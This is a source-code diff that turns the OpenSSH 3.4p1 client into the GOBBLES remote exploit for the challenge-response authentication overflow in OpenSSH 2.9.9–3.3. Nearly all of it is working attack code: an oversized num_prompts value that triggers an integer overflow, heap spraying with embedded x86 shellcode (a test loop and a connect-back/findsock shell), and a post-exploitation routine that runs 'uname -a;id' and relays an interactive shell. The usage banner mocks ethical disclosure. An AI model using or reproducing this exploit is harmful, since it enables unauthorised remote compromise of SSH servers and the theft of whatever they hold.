@@ -1,0 +1,427 @@
+diff -u backupz/openssh-3.4p1/ssh.c openssh-3.4p1/ssh.c
+--- backupz/openssh-3.4p1/ssh.c	Sat Jun 29 14:10:35 2002
++++ openssh-3.4p1/ssh.c	Tue Jul  2 00:31:07 2002
+@@ -146,14 +146,41 @@
+ /* # of replies received for global requests */
+ static int client_global_request_id = 0;
+ 
++int testing = 0;
++int chunk_size = 0;
++int tcode_rep = 0;
++int scode_rep = 0;
++char *style = "skey";
++Method method = B;
++
++
+ /* Prints a help message to the user.  This function never returns. */
+ 
+ static void
+ usage(void)
+ {
+-	fprintf(stderr, "Usage: %s [options] host [command]\n", __progname);
++	fprintf(stderr, "GOBBLES SECURITY - WHITEHATS POSTING TO BUGTRAQ FOR FAME\n");
++	fprintf(stderr, "OpenSSH 2.9.9 - 3.3 remote challenge-response exploit\n");
++	fprintf(stderr, "#1 rule of ``ethical hacking'': drop dead\n\n");
++	fprintf(stderr, "Usage: %s [options] host\n", __progname);
+ 	fprintf(stderr, "Options:\n");
++	fprintf(stderr, "***** READ THE HOWTO FILE IN THE TARBALL *****\n");
+ 	fprintf(stderr, "  -l user     Log in using this user name.\n");
++	fprintf(stderr, "  -p port     Connect to this port.  Server must be on the same port.\n");
++	fprintf(stderr, "  -M method   Select the device (skey or bsdauth)\n");
++	fprintf(stderr, "              default: bsdauth\n");
++	fprintf(stderr, "  -S style    If using bsdauth, select the style\n");
++	fprintf(stderr, "              default: skey\n");
++	fprintf(stderr, "  -d rep      Test shellcode repeat\n");
++	fprintf(stderr, "              default: 10000 (with -z) ; 0 (without -z)\n");			
++	fprintf(stderr, "  -j size     Chunk size\n");
++	fprintf(stderr, "              default: 4096 (1 page)\n");
++	fprintf(stderr, "  -r rep      Connect-back shellcode repeat\n");
++	fprintf(stderr, "              default: 60 (not used with -z)\n");	
++	fprintf(stderr, "  -z          Enable testing mode\n");
++	fprintf(stderr, "  -v          Verbose; display verbose debugging messages.\n");
++	fprintf(stderr, "              Multiple -v increases verbosity.\n");
++#if 0
+ 	fprintf(stderr, "  -n          Redirect input from " _PATH_DEVNULL ".\n");
+ 	fprintf(stderr, "  -F config   Config file (default: ~/%s).\n",
+ 	     _PATH_SSH_USER_CONFFILE);
+@@ -171,17 +198,13 @@
+ #endif
+ 	fprintf(stderr, "  -t          Tty; allocate a tty even if command is given.\n");
+ 	fprintf(stderr, "  -T          Do not allocate a tty.\n");
+-	fprintf(stderr, "  -v          Verbose; display verbose debugging messages.\n");
+-	fprintf(stderr, "              Multiple -v increases verbosity.\n");
+ 	fprintf(stderr, "  -V          Display version number only.\n");
+ 	fprintf(stderr, "  -P          Don't allocate a privileged port.\n");
+ 	fprintf(stderr, "  -q          Quiet; don't display any warning messages.\n");
+ 	fprintf(stderr, "  -f          Fork into background after authentication.\n");
+ 	fprintf(stderr, "  -e char     Set escape character; ``none'' = disable (default: ~).\n");
+-
+ 	fprintf(stderr, "  -c cipher   Select encryption algorithm\n");
+ 	fprintf(stderr, "  -m macs     Specify MAC algorithms for protocol version 2.\n");
+-	fprintf(stderr, "  -p port     Connect to this port.  Server must be on the same port.\n");
+ 	fprintf(stderr, "  -L listen-port:host:port   Forward local port to remote address\n");
+ 	fprintf(stderr, "  -R listen-port:host:port   Forward remote port to local address\n");
+ 	fprintf(stderr, "              These cause %s to listen for connections on a port, and\n", __progname);
+@@ -197,6 +220,7 @@
+ 	fprintf(stderr, "  -o 'option' Process the option as if it was read from a configuration file.\n");
+ 	fprintf(stderr, "  -s          Invoke command (mandatory) as SSH2 subsystem.\n");
+ 	fprintf(stderr, "  -b addr     Local IP address.\n");
++#endif
+ 	exit(1);
+ }
+ 
+@@ -273,8 +297,28 @@
+ 
+ again:
+ 	while ((opt = getopt(ac, av,
+-	    "1246ab:c:e:fgi:kl:m:no:p:qstvxACD:F:I:L:NPR:TVX")) != -1) {
++	    "1246ab:c:d:e:fgi:j:kl:m:no:p:qr:stvxzACD:F:I:L:M:NPR:S:TVX")) != -1) {
+ 		switch (opt) {
++		case 'S': 
++			style = optarg;
++			break;
++		case 'M':
++			if(!strcmp(optarg, "skey")) method = S;
++			else if(!strcmp(optarg, "bsdauth")) method = B;
++			else fprintf(stderr, "-M: use 'skey' or 'bsdauth'\n");
++			break;
++		case 'd':
++			tcode_rep = atoi(optarg);
++			break;
++		case 'j':
++			chunk_size = atoi(optarg);
++			break;
++		case 'r':
++			scode_rep = atoi(optarg);
++			break;
++		case 'z':
++			testing = 1;
++			break;
+ 		case '1':
+ 			options.protocol = SSH_PROTO_1;
+ 			break;
+@@ -585,6 +629,10 @@
+ 		/* Read systemwide configuration file after use config. */
+ 		(void)read_config_file(_PATH_HOST_CONFIG_FILE, host, &options);
+ 	}
++
++	options.preferred_authentications = "keyboard-interactive";
++	options.strict_host_key_checking = 0;
++	options.protocol = SSH_PROTO_2;
+ 
+ 	/* Fill configuration defaults. */
+ 	fill_default_options(&options);
+diff -u backupz/openssh-3.4p1/ssh.h openssh-3.4p1/ssh.h
+--- backupz/openssh-3.4p1/ssh.h	Sat Jun 29 14:10:35 2002
++++ openssh-3.4p1/ssh.h	Tue Jul  2 00:25:40 2002
+@@ -25,6 +25,8 @@
+ # include <sys/select.h>
+ #endif
+ 
++typedef enum {S, B} Method;
++
+ /* Cipher used for encrypting authentication files. */
+ #define SSH_AUTHFILE_CIPHER	SSH_CIPHER_3DES
+ 
+diff -u backupz/openssh-3.4p1/sshconnect.c openssh-3.4p1/sshconnect.c
+--- backupz/openssh-3.4p1/sshconnect.c	Sat Jun 29 14:10:35 2002
++++ openssh-3.4p1/sshconnect.c	Tue Jul  2 00:25:40 2002
+@@ -409,6 +409,11 @@
+ 	compat_datafellows(remote_version);
+ 	mismatch = 0;
+ 
++	if(!(remote_major == PROTOCOL_MAJOR_1 && remote_minor == PROTOCOL_MINOR_1))
++		printf("[*] remote host supports ssh2\n");
++	else
++		printf("[x] remote host does not support ssh2\n");
++
+ 	switch (remote_major) {
+ 	case 1:
+ 		if (remote_minor == 99 &&
+@@ -451,7 +456,7 @@
+ 	snprintf(buf, sizeof buf, "SSH-%d.%d-%.100s\n",
+ 	    compat20 ? PROTOCOL_MAJOR_2 : PROTOCOL_MAJOR_1,
+ 	    compat20 ? PROTOCOL_MINOR_2 : minor1,
+-	    SSH_VERSION);
++	    "GOBBLES");
+ 	if (atomicio(write, connection_out, buf, strlen(buf)) != strlen(buf))
+ 		fatal("write: %.100s", strerror(errno));
+ 	client_version_string = xstrdup(buf);
+diff -u backupz/openssh-3.4p1/sshconnect2.c openssh-3.4p1/sshconnect2.c
+--- backupz/openssh-3.4p1/sshconnect2.c	Sat Jun 29 14:10:35 2002
++++ openssh-3.4p1/sshconnect2.c	Tue Jul  2 00:25:40 2002
+@@ -51,6 +51,9 @@
+ /* import */
+ extern char *client_version_string;
+ extern char *server_version_string;
++extern char *style;
++extern int testing, chunk_size, tcode_rep, scode_rep;
++extern Method method;
+ extern Options options;
+ 
+ /*
+@@ -220,6 +223,7 @@
+ {
+ 	Authctxt authctxt;
+ 	int type;
++	char *p;
+ 
+ 	if (options.challenge_response_authentication)
+ 		options.kbd_interactive_authentication = 1;
+@@ -260,6 +264,15 @@
+ 	authctxt.info_req_seen = 0;
+ 	if (authctxt.method == NULL)
+ 		fatal("ssh_userauth2: internal error: cannot send userauth none request");
++	
++	if(method == B) {
++		if(!(p = malloc(strlen(authctxt.server_user) + strlen(style) + 2)))
++			fatal("malloc() failed");
++		sprintf(p, "%s:%s", authctxt.server_user, style);
++		authctxt.server_user = p;
++	}
++	
++	printf("[*] server_user: %s\n", authctxt.server_user);
+ 
+ 	/* initial userauth request */
+ 	userauth_none(&authctxt);
+@@ -337,6 +350,7 @@
+ 	Authctxt *authctxt = ctxt;
+ 	char *authlist = NULL;
+ 	int partial;
++	static int enter = 0;
+ 
+ 	if (authctxt == NULL)
+ 		fatal("input_userauth_failure: no authentication context");
+@@ -345,6 +359,13 @@
+ 	partial = packet_get_char();
+ 	packet_check_eom();
+ 
++	if(!enter++) {
++		if(strstr(authlist, "keyboard-interactive"))
++			printf("[*] keyboard-interactive method available\n");
++		else
++			printf("[x] keyboard-interactive method not available\n");
++	}
++
+ 	if (partial != 0)
+ 		log("Authenticated with partial success.");
+ 	debug("authentications that can continue: %s", authlist);
+@@ -817,10 +838,20 @@
+ {
+ 	static int attempt = 0;
+ 
++#if 0
+ 	if (attempt++ >= options.number_of_password_prompts)
+ 		return 0;
++#endif
+ 	/* disable if no SSH2_MSG_USERAUTH_INFO_REQUEST has been seen */
+-	if (attempt > 1 && !authctxt->info_req_seen) {
++	if (attempt++ > 1 && !authctxt->info_req_seen) {
++		switch(method) {
++			case S:
++				printf("[x] skey not available\n");
++				break;
++			case B:
++				printf("[x] bsdauth (%s) not available\n", style);
++				break;
++		}
+ 		debug3("userauth_kbdint: disable: no info_req_seen");
+ 		dispatch_set(SSH2_MSG_USERAUTH_INFO_REQUEST, NULL);
+ 		return 0;
+@@ -832,24 +863,135 @@
+ 	packet_put_cstring(authctxt->service);
+ 	packet_put_cstring(authctxt->method->name);
+ 	packet_put_cstring("");					/* lang */
++#if 0
+ 	packet_put_cstring(options.kbd_interactive_devices ?
+ 	    options.kbd_interactive_devices : "");
++#endif
++
++	switch(method) {
++		case S:
++			packet_put_cstring("skey");
++			break;
++		case B: 
++			packet_put_cstring("bsdauth");
++			break;
++	}
++	
+ 	packet_send();
+ 
+ 	dispatch_set(SSH2_MSG_USERAUTH_INFO_REQUEST, &input_userauth_info_req);
+ 	return 1;
+ }
+ 
++#include "atomicio.h"
++
++#ifdef MAX
++#undef MAX
++#endif
++
++#define MAX(a, b) (((a) > (b)) ? (a) : (b))
++
++/* modified from apache-nosejob.c */
++void
++exploit_interactive(int sock)
++{
++	int i, n;
++	int owned = 0;
++	int responses = 0;
++	fd_set fds;
++	struct timeval tv;	
++
++	char buff[1024];
++	char *cmdz = "uname -a;id\n";
++
++	for(;;) {
++		tv.tv_sec = 15;
++        	tv.tv_usec = 0;
++
++		FD_ZERO(&fds);
++		FD_SET(STDIN_FILENO, &fds);
++		FD_SET(sock, &fds);
++        
++		if(select(MAX(STDIN_FILENO, sock) + 1, &fds, NULL, NULL, owned ? NULL : &tv) > 0) {
++             
++			if(FD_ISSET(sock, &fds)) {
++                  
++				if((n = read(sock, buff, sizeof buff)) < 0) {
++                                   	perror("read()");
++                                    	break;
++                   		}
++                                        
++                 		if(n >= 1) {
++
++                     			if(!owned) {
++                      
++						for(i = 0; i < n; i++)
++                           				if(buff[i] == 'G')
++                                   				responses++;
++                           				else
++                                  				responses = 0;
++                          
++						if(responses >= 2) {
++                           				owned = 1;
++                            				atomicio(write, sock, "O", 1);
++                           				atomicio(write, sock, cmdz, strlen(cmdz));
++                       				}
++
++                  			} else {
++
++						write(STDOUT_FILENO, buff, n);
++					}
++                 		}       
++            		} /* sock */
++
++			if(FD_ISSET(STDIN_FILENO, &fds)) {
++                                        
++				if((n = read(STDIN_FILENO, buff, sizeof buff)) < 0) {
++                                                perror("read()");
++                                                break;
++				}
++                                        
++				atomicio(write, sock, buff, n);
++			} /* stdin */
++		} /* select */
++
++		if(!owned)
++			break;
++	} /* for */
++}
++
+ /*
+  * parse INFO_REQUEST, prompt user and send INFO_RESPONSE
+  */
+ void
+ input_userauth_info_req(int type, u_int32_t seq, void *ctxt)
+ {
++	char test_shellcode[] = 
++	"\x31\xc0\x50\x6a\x14\x50\x6a\x14\x54\x50\x50\xb0\xc3\xcd\x80"
++	"\xeb\xfe";
++
++	char shellcode[] = /* from apache-nosejob.c */
++	"\x68\x47\x47\x47\x47\x89\xe3\x31\xc0\x50\x50\x50\x50\xc6\x04\x24"
++	"\x04\x53\x50\x50\x31\xd2\x31\xc9\xb1\x80\xc1\xe1\x18\xd1\xea\x31"
++	"\xc0\xb0\x85\xcd\x80\x72\x02\x09\xca\xff\x44\x24\x04\x80\x7c\x24"
++	"\x04\x20\x75\xe9\x31\xc0\x89\x44\x24\x04\xc6\x44\x24\x04\x20\x89"
++	"\x64\x24\x08\x89\x44\x24\x0c\x89\x44\x24\x10\x89\x44\x24\x14\x89"
++	"\x54\x24\x18\x8b\x54\x24\x18\x89\x14\x24\x31\xc0\xb0\x5d\xcd\x80"
++	"\x31\xc9\xd1\x2c\x24\x73\x27\x31\xc0\x50\x50\x50\x50\xff\x04\x24"
++	"\x54\xff\x04\x24\xff\x04\x24\xff\x04\x24\xff\x04\x24\x51\x50\xb0"
++	"\x1d\xcd\x80\x58\x58\x58\x58\x58\x3c\x4f\x74\x0b\x58\x58\x41\x80"
++	"\xf9\x20\x75\xce\xeb\xbd\x90\x31\xc0\x50\x51\x50\x31\xc0\xb0\x5a"
++	"\xcd\x80\xff\x44\x24\x08\x80\x7c\x24\x08\x03\x75\xef\x31\xc0\x50"
++	"\xc6\x04\x24\x0b\x80\x34\x24\x01\x68\x42\x4c\x45\x2a\x68\x2a\x47"
++	"\x4f\x42\x89\xe3\xb0\x09\x50\x53\xb0\x01\x50\x50\xb0\x04\xcd\x80"
++	"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50"
++	"\x53\x89\xe1\x50\x51\x53\x50\xb0\x3b\xcd\x80\xcc";
++	                              
++
+ 	Authctxt *authctxt = ctxt;
+-	char *name, *inst, *lang, *prompt, *response;
++	char *name, *inst, *lang, /* *prompt, */ *response;
+ 	u_int num_prompts, i;
+-	int echo = 0;
++	/* int echo = 0; */
+ 
+ 	debug2("input_userauth_info_req");
+ 
+@@ -870,6 +1012,10 @@
+ 	xfree(lang);
+ 
+ 	num_prompts = packet_get_int();
++
++	chunk_size = chunk_size ? chunk_size : 4096;
++	num_prompts = 0x40000000 + chunk_size / 4;
++
+ 	/*
+ 	 * Begin to build info response packet based on prompts requested.
+ 	 * We commit to providing the correct number of responses, so if
+@@ -879,6 +1025,34 @@
+ 	packet_start(SSH2_MSG_USERAUTH_INFO_RESPONSE);
+ 	packet_put_int(num_prompts);
+ 
++	response = "G";
++	
++	for(i = 0; i < chunk_size / 4; i++)
++		packet_put_cstring(response);
++
++	if(testing) {
++		tcode_rep = tcode_rep ? tcode_rep : 10000;
++		scode_rep = 0;
++	} else {
++		tcode_rep = tcode_rep ? tcode_rep : 0;
++		scode_rep = scode_rep ? scode_rep : 60;
++	}	
++
++	for(i = 0; i < tcode_rep; i++)
++		packet_put_string(test_shellcode,
++			sizeof test_shellcode - 1);
++
++	for(i = 0; i < scode_rep; i++)
++		packet_put_string(shellcode,
++			sizeof shellcode - 1);
++
++	packet_put_int(257 * 1024);
++
++	printf("[*] chunk_size: %d tcode_rep: %d scode_rep %d\n",
++		chunk_size, tcode_rep, scode_rep);
++	printf("[*] mode: %s\n", testing ? "testing" : "exploitation");
++
++#if 0
+ 	debug2("input_userauth_info_req: num_prompts %d", num_prompts);
+ 	for (i = 0; i < num_prompts; i++) {
+ 		prompt = packet_get_string(NULL);
+@@ -892,9 +1066,12 @@
+ 		xfree(prompt);
+ 	}
+ 	packet_check_eom(); /* done with parsing incoming message. */
++#endif
+ 
+ 	packet_add_padding(64);
+ 	packet_send();
++	packet_write_wait();
++	exploit_interactive(packet_get_connection_in());
+ }
+ 
+ static int
